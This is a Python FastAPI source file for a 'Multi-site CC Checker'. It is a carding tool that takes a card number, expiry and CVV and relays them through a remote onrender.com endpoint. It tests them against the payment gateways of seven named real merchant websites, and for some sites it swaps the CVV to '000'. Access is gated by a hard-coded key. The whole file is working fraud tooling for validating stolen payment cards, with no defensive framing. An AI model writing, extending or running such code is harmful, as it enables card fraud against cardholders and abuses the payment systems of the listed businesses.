from fastapi import FastAPI, Request, HTTPException
from fastapi.responses import JSONResponse
import aiohttp
import asyncio
import time
import json
from typing import List, Dict, Any

app = FastAPI(title="Multi-site CC Checker")

# ------------ Configuration ------------
ALLOWED_GATEWAY = "killer"
ALLOWED_KEY = "rockybest"

SITES: List[str] = [
    "https://deltacloudz.com",
    "https://therapyessentials.coraphysicaltherapy.com",
    "https://restart.brooksrunning.com",
    "https://lptmedical.com",
    "https://livelovespa.com",
    "https://safeandsoundhq.com",
    "https://urbanspaceinteriors.com"
    
]

REMOTE_API_TEMPLATE = "https://rockyysoon-fb0f.onrender.com/index.php?site={site}&cc={cc}"

MAX_CONCURRENT = 1          # Run 2-3 sites in parallel
REQUEST_TIMEOUT = 40        # seconds per request
CONNECT_TIMEOUT = 25        # seconds for connection
# ---------------------------------------

def parse_cc(cc_raw: str):
    parts = cc_raw.split("|")
    if len(parts) < 4:
        raise ValueError("Invalid CC format. Expecting PAN|MM|YY|CVV")
    return parts[0], parts[1], parts[2], parts[3]

async def fetch_site(session: aiohttp.ClientSession, site: str, cc_for_site: str, sem: asyncio.Semaphore) -> Dict[str, Any]:
    url = REMOTE_API_TEMPLATE.format(site=site, cc=cc_for_site)
    async with sem:
        start = time.perf_counter()
        try:
            timeout = aiohttp.ClientTimeout(total=REQUEST_TIMEOUT, connect=CONNECT_TIMEOUT)
            async with session.get(url, timeout=timeout) as resp:
                raw_text = await resp.text()
                try:
                    parsed = json.loads(raw_text)
                except Exception:
                    parsed = {"error": raw_text.strip()}
                return {
                    "gateway": "Authorize.net",
                    "api": url,
                    "cc": cc_for_site,
                    "response": parsed
                }
        except Exception as e:
            return {
                "gateway": "Authorize.net",
                "api": url,
                "cc": cc_for_site,
                "response": {"error": str(e)}
            }

@app.get("/gateway")
async def gateway(request: Request):
    params = request.query_params
    gateway = params.get("gateway")
    key = params.get("key")
    cc_raw = params.get("cc")

    if not gateway or not key or not cc_raw:
        raise HTTPException(status_code=400, detail="Missing parameters: gateway, key, cc")
    if gateway != ALLOWED_GATEWAY or key != ALLOWED_KEY:
        raise HTTPException(status_code=403, detail="Unauthorized gateway/key")

    try:
        pan, mm, yy, cvv = parse_cc(cc_raw)
    except ValueError as e:
        raise HTTPException(status_code=400, detail=str(e))

    # Prepare CC for sites (first 5 original, last 5 with 000)
    cc_per_site = []
    for i, site in enumerate(SITES[:10]):
        cc_for_site = f"{pan}|{mm}|{yy}|000" if i >= 5 else cc_raw
        cc_per_site.append((site, cc_for_site))

    sem = asyncio.Semaphore(MAX_CONCURRENT)
    start_time = time.perf_counter()

    connector = aiohttp.TCPConnector(limit_per_host=MAX_CONCURRENT)
    headers = {"User-Agent": "MultiSiteCCChecker/1.0", "Accept": "application/json"}

    async with aiohttp.ClientSession(connector=connector, headers=headers) as session:
        tasks = [fetch_site(session, site, cc, sem) for site, cc in cc_per_site]
        results = await asyncio.gather(*tasks)

    total_time_sec = int(time.perf_counter() - start_time)
    minutes = total_time_sec // 60
    seconds = total_time_sec % 60
    total_time_formatted = f"{minutes}m:{seconds}s"

    final_response = {
        "total_time": total_time_formatted,
        "results": results
    }

    return JSONResponse(content=final_response)

if __name__ == "__main__":
    import uvicorn
    uvicorn.run("app:app", host="0.0.0.0", port=8000, reload=False)
